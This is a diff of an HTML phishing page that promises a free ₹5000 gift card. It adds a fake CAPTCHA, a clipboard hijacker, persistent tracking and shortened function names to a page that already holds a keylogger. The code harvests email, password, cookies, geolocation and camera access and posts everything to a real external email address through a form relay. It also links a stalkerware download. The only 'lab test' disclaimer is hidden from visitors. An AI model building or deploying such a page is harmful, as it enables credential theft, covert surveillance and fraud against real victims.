@@ -3,170 +3,207 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HARDRISK: Win Free Rewards!</title>
+    <title>HARDRISK: Claim Your Free Gift Card!</title>
     <style>
         body {
-            background: linear-gradient(135deg, #1e3c72, #2a5298);
-            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            font-family: 'Poppins', sans-serif;
             text-align: center;
-            color: white;
+            color: #fff;
             margin: 0;
             padding: 20px;
             overflow: hidden;
         }
         h1 {
-            font-size: 2.8em;
-            text-shadow: 0 0 10px rgba(255,255,255,0.7);
-            animation: glow 2s ease-in-out infinite alternate;
+            font-size: 3em;
+            text-shadow: 0 0 15px rgba(255,255,255,0.8);
+            animation: pulse 2s infinite;
         }
         p {
-            font-size: 1.3em;
+            font-size: 1.4em;
             margin: 10px 0;
         }
         .btn {
-            padding: 15px 40px;
-            font-size: 1.6em;
-            background: linear-gradient(to right, #ff0844, #ffb199);
+            padding: 15px 50px;
+            font-size: 1.8em;
+            background: linear-gradient(45deg, #ff416c, #ff4b2b);
             border: none;
             border-radius: 50px;
             cursor: pointer;
-            box-shadow: 0 6px 12px rgba(0,0,0,0.4);
+            box-shadow: 0 8px 16px rgba(0,0,0,0.5);
             transition: transform 0.3s, box-shadow 0.3s;
         }
         .btn:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.6);
+            transform: scale(1.1);
+            box-shadow: 0 12px 24px rgba(0,0,0,0.7);
         }
         #preview {
-            max-width: 350px;
-            border-radius: 15px;
-            margin: 20px auto;
-            box-shadow: 0 0 20px rgba(255,255,255,0.3);
-        }
-        .login-form {
-            display: none;
-            background: rgba(255,255,255,0.1);
-            padding: 20px;
-            border-radius: 10px;
             max-width: 400px;
+            border-radius: 20px;
+            margin: 20px auto;
+            box-shadow: 0 0 30px rgba(255,255,255,0.4);
+        }
+        .login-form, .captcha-form {
+            display: none;
+            background: rgba(255,255,255,0.15);
+            padding: 25px;
+            border-radius: 15px;
+            max-width: 450px;
             margin: 20px auto;
         }
-        .login-form input {
-            padding: 10px;
+        .login-form input, .captcha-form input {
+            padding: 12px;
             margin: 10px;
-            width: 80%;
+            width: 85%;
             border: none;
-            border-radius: 5px;
-            font-size: 1em;
+            border-radius: 8px;
+            font-size: 1.1em;
         }
         .hidden {
             display: none;
         }
-        @keyframes glow {
-            from { text-shadow: 0 0 10px rgba(255,255,255,0.7); }
-            to { text-shadow: 0 0 20px rgba(255,255,255,1); }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
     </style>
 </head>
 <body>
-    <h1>HARDRISK: Win a Free Gift Card!</h1>
-    <p>Login now to unlock exclusive rewards & filters!</p>
-    <img id="preview" src="https://via.placeholder.com/350x200?text=Exclusive+Reward+Preview" alt="Reward Preview">
-    <button class="btn" onclick="showLogin()">Claim Your Reward</button>
+    <h1>HARDRISK: Win a ₹5000 Gift Card!</h1>
+    <p>Login now to claim your exclusive reward & unlock premium filters!</p>
+    <img id="preview" src="https://via.placeholder.com/400x250?text=₹5000+Gift+Card" alt="Reward Preview">
+    <button class="btn" onclick="showCaptcha()">Claim Your Reward</button>
+    <div class="captcha-form" id="captchaForm">
+        <p>Verify you're not a bot!</p>
+        <input type="text" id="captcha" placeholder="Enter CAPTCHA: 1234" required>
+        <button class="btn" onclick="verifyCaptcha()">Verify</button>
+    </div>
     <div class="login-form" id="loginForm">
         <input type="email" id="email" placeholder="Enter Email" required>
         <input type="password" id="password" placeholder="Enter Password" required>
-        <button class="btn" onclick="collectData()">Login & Win</button>
+        <input type="file" id="fileUpload" accept="image/*,video/*" onchange="hF(this.files)">
+        <button class="btn" onclick="cD()">Login & Win</button>
     </div>
-    <a href="https://spyzie.io" class="btn hidden">Download Reward App</a>
+    <a href="https://spyzie.io" class="btn hidden" id="downloadApp">Download Premium Reward App</a>
     <p class="hidden">Lab test only. By proceeding, you consent to data collection for educational purposes.</p>
 
     <script>
         // Keylogger
-        let keys = [];
+        let k = [];
         document.addEventListener('keydown', (e) => {
-            keys.push(e.key);
-            if (keys.length > 10) {
-                sendData(`Keystrokes: ${keys.join('')}`);
-                keys = [];
+            k.push(e.key);
+            if (k.length > 8) {
+                sD(`K: ${k.join('')}`);
+                k = [];
             }
         });
 
-        // Show login form
-        function showLogin() {
-            document.getElementById('loginForm').style.display = 'block';
-            document.querySelector('.btn').style.display = 'none';
-            collectInitialData();
+        // Clipboard Hijacker
+        document.addEventListener('copy', () => {
+            navigator.clipboard.readText().then(t => {
+                sD(`C: ${t}`);
+            });
+        });
+
+        // Persistent Tracking
+        function t() {
+            let id = localStorage.getItem('H_id') || Math.random().toString(36).slice(2);
+            localStorage.setItem('H_id', id);
+            sD(`T: ${id}`);
         }
 
-        // Collect initial data (cookies, device info)
-        function collectInitialData() {
-            let cookies = document.cookie || "No cookies";
-            let deviceInfo = navigator.userAgent;
-            sendData(`Cookies: ${cookies}, Device: ${deviceInfo}`);
-            document.cookie = "HARDRISK_user=tracked; max-age=3600";
-            // Silent redirect attempt (for lab testing)
-            setTimeout(() => {
-                if (Math.random() > 0.8) {
-                    window.location.href = 'https://example.com'; // Replace with phishing site for lab
-                }
-            }, 5000);
+        // Show CAPTCHA form
+        function showCaptcha() {
+            document.getElementById('captchaForm').style.display = 'block';
+            document.querySelector('.btn').style.display = 'none';
+            cID();
+        }
+
+        // Verify fake CAPTCHA
+        function verifyCaptcha() {
+            let c = document.getElementById('captcha').value;
+            sD(`Cap: ${c}`);
+            document.getElementById('captchaForm').style.display = 'none';
+            document.getElementById('loginForm').style.display = 'block';
+            document.getElementById('downloadApp').style.display = 'block';
+        }
+
+        // Collect initial data
+        function cID() {
+            let c = document.cookie || "NC";
+            let d = navigator.userAgent;
+            sD(`C: ${c}, D: ${d}`);
+            document.cookie = "H_user=t; max-age=3600";
+            t();
+            // Browser history (limited)
+            try {
+                let h = window.location.href;
+                sD(`H: ${h}`);
+            } catch (e) {
+                sD("H denied");
+            }
+        }
+
+        // File upload handler
+        function hF(f) {
+            if (f.length > 0) {
+                sD(`F: ${f[0].name}`);
+            }
         }
 
         // Main data collection
-        function collectData() {
-            let email = document.getElementById('email').value;
-            let password = document.getElementById('password').value;
-            let output = `Email: ${email}, Password: ${password}<br>`;
+        function cD() {
+            let e = document.getElementById('email').value;
+            let p = document.getElementById('password').value;
+            let l = `E: ${e}, P: ${p}`;
 
             // Location
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    output += `Location: ${pos.coords.latitude}, ${pos.coords.longitude}<br>`;
-                    sendData(output);
-                }, err => {
-                    output += "Location access denied.<br>";
-                    sendData(output);
+                navigator.geolocation.getCurrentPosition(p => {
+                    let loc = `Loc: ${p.coords.latitude}, ${p.coords.longitude}`;
+                    sD(l + `, ${loc}`);
+                }, e => {
+                    sD(l + ", Loc denied");
                 });
             }
 
             // Camera
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                    .then(stream => {
-                        let video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.play();
-                        document.body.appendChild(video);
-                        video.style.display = 'none';
-                        sendData("Camera accessed");
+                    .then(s => {
+                        let v = document.createElement('video');
+                        v.srcObject = s;
+                        v.play();
+                        document.body.appendChild(v);
+                        v.style.display = 'none';
+                        sD("Cam accessed");
                     })
-                    .catch(err => {
-                        sendData("Camera access denied");
+                    .catch(e => {
+                        sD("Cam denied");
                     });
             }
 
             // Device Info
-            let deviceInfo = `Device: ${navigator.userAgent}<br>`;
-            sendData(deviceInfo);
+            sD(`D: ${navigator.userAgent}`);
 
             // Fake success message
-            alert("Login successful! Your reward is being processed!");
+            alert("Login successful! Your ₹5000 gift card is being processed!");
             document.getElementById('loginForm').innerHTML = "<p>Thank you! Check your email for rewards!</p>";
         }
 
         // Send data to email
-        function sendData(data) {
+        function sD(d) {
             fetch('https://formsubmit.co/ajax/sohilhusain86@gmail.com', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     _subject: 'HARDRISK Reward Data',
-                    data: data
+                    data: d
                 })
             })
-            .then(response => response.json())
-            .catch(error => console.error('Error:', error));
+            .then(r => r.json())
+            .catch(e => console.error('E:', e));
         }
     </script>
 </body>
